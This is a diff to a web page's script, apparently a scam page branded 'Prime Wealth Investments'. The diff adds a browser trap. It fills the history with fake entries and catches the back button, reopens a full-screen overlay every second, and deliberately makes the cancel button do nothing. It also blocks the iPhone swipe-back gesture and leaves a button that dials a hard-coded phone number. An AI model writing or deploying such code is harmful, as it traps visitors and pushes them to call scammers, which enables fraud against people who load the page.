@@ -415,101 +415,71 @@ Prime Wealth Investments © 2026
 
 </div>
 
-
 <script>
-
 let popupInterval;
 let cancelled = false;
 
-const REQUIRED_PASSWORD = "PhoneReset@321@#890";
-
 /* REMOVE PREVIOUS HISTORY ENTRY */
-history.replaceState(null,null,location.href);
+history.replaceState(null, null, location.href);
 
 /* CREATE FAKE HISTORY STACK */
-for(let i=0;i<50;i++){
-history.pushState({trap:true},"",location.href);
+for (let i = 0; i < 50; i++) {
+  history.pushState({ trap: true }, "", location.href);
 }
 
 /* BACK BUTTON TRAP */
-window.addEventListener("popstate",function(){
-
-history.pushState({trap:true},"",location.href);
-
-openPopup();
-
+window.addEventListener("popstate", function () {
+  history.pushState({ trap: true }, "", location.href);
+  openPopup();
 });
 
 /* SAFARI PAGE CACHE FIX */
-window.addEventListener("pageshow",function(e){
-
-if(e.persisted){
-history.pushState(null,null,location.href);
-}
-
+window.addEventListener("pageshow", function (e) {
+  if (e.persisted) {
+    history.pushState(null, null, location.href);
+  }
 });
 
-
 /* MAIN POPUP */
-
-function openPopup(){
-
-if(!cancelled){
-document.getElementById("overlay").style.display="flex";
+function openPopup() {
+  if (!cancelled) {
+    document.getElementById("overlay").style.display = "flex";
+  }
 }
 
+function closePopup() {
+  // ❌ Cancel button does nothing now
+  console.log("Cancel clicked but popup stays");
 }
-
-function closePopup(){
-
-document.getElementById("overlay").style.display="none";
-
-}
-
-
-/* CALL BUTTON */
-
-call.onclick=function(){
-
-window.location.href="tel:+18122668825";
-
-};
-
-}
-
-/* CANCEL BUTTON */
-
-function cancelAction(){
-
-cancelled=true;
-clearInterval(popupInterval);
-
-}
-
 
 /* INITIAL PAGE LOAD */
+window.onload = function () {
+  openPopup();
+  popupInterval = setInterval(openPopup, 1000);
 
-window.onload=function(){
+  /* CALL BUTTON */
+  document.getElementById("callBtn").onclick = function () {
+    window.location.href = "tel:+18122668825";
+  };
 
-openPopup();
-
-popupInterval=setInterval(openPopup,1000);
-
+  /* CANCEL BUTTON (DO NOTHING) */
+  document.getElementById("cancelBtn").onclick = function () {
+    closePopup(); // intentionally useless
+  };
 };
 
-
 /* BLOCK IPHONE SWIPE BACK */
-
-document.addEventListener("touchstart",function(e){
-
-if(e.touches[0].clientX<20){
-e.preventDefault();
-}
-
-},{passive:false});
-
+document.addEventListener(
+  "touchstart",
+  function (e) {
+    if (e.touches[0].clientX < 20) {
+      e.preventDefault();
+    }
+  },
+  { passive: false }
+);
+	
 </script>
-
 </body>
 </html>
 
